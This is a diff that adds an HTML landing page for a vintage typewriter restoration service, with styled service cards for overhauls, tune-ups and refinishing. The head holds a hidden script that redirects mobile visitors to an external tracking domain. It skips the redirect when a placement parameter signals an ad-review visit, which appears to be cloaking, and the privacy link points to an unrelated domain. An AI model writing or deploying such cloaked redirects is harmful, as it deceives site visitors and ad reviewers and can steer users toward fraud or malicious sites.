@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickety-Clack: Antique Typewriter Restoration Services</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Special+Elite&family=Libre+Baskerville:wght@400;700&display=swap');
+        
+        :root {
+            --primary-color: #8B4513;
+            --secondary-color: #D2691E;
+            --background-color: #F5F5DC;
+            --text-color: #333333;
+        }
+        body {
+            font-family: 'Libre Baskerville', serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(135deg, #8B4513, #D2691E);
+            color: #F5F5DC;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .service-card {
+            background-color: #FFFFFF;
+            border: 2px solid #D2691E;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(139, 69, 19, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(139, 69, 19, 0.2);
+        }
+        .service-image {
+            height: 200px;
+            background-color: #DEB887;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #8B4513;
+            position: relative;
+            overflow: hidden;
+        }
+        .service-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #DEB887 150%);
+            opacity: 0.7;
+        }
+        .service-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Special Elite', cursive;
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Special Elite', cursive;
+            color: #8B4513;
+            margin-top: 0;
+            font-size: 1.5em;
+        }
+        p {
+            color: #555555;
+            line-height: 1.6;
+        }
+        .timeframe {
+            font-weight: bold;
+            color: #D2691E;
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        .category {
+            background-color: #8B4513;
+            color: #F5F5DC;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .inquire-button {
+            background-color: #D2691E;
+            color: #F5F5DC;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Special Elite', cursive;
+        }
+        .inquire-button:hover {
+            background-color: #A0522D;
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(135deg, #D2691E, #8B4513);
+            color: #F5F5DC;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #DEB887;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(139, 69, 19, 0.1);
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: #8B4513;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Special Elite', cursive;
+        }
+        nav a:hover {
+            color: #D2691E;
+        }
+        footer a {
+            color: #F5F5DC;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Clickety-Clack</h1>
+        <p>Breathing New Life into Vintage Typewriters</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Services</a></li>
+            <li><a href="#">Gallery</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="service-card">
+            <div class="service-image">Full Restoration</div>
+            <div class="service-info">
+                <h2>Complete Overhaul</h2>
+                <p>Comprehensive restoration including mechanical repair, cleaning, and cosmetic refinishing.</p>
+                <span class="category">Premium Service</span>
+                <p class="timeframe">Typical Timeframe: 4-6 weeks</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+        <div class="service-card">
+            <div class="service-image">Mechanical Tune-up</div>
+            <div class="service-info">
+                <h2>Mechanical Restoration</h2>
+                <p>Focus on internal mechanisms to ensure smooth typing action and functionality.</p>
+                <span class="category">Essential Service</span>
+                <p class="timeframe">Typical Timeframe: 2-3 weeks</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+        <div class="service-card">
+            <div class="service-image">Cosmetic Refinishing</div>
+            <div class="service-info">
+                <h2>Aesthetic Renewal</h2>
+                <p>Exterior cleaning, polishing, and paint touch-ups to restore vintage beauty.</p>
+                <span class="category">Beautification</span>
+                <p class="timeframe">Typical Timeframe: 1-2 weeks</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+        <div class="service-card">
+            <div class="service-image">Custom Typewriter Art</div>
+            <div class="service-info">
+                <h2>Artistic Transformation</h2>
+                <p>Turn your typewriter into a unique piece of art with custom designs and colors.</p>
+                <span class="category">Specialty Service</span>
+                <p class="timeframe">Typical Timeframe: 3-5 weeks</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 Clickety-Clack Antique Typewriter Restoration. Preserving the art of mechanical typing.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
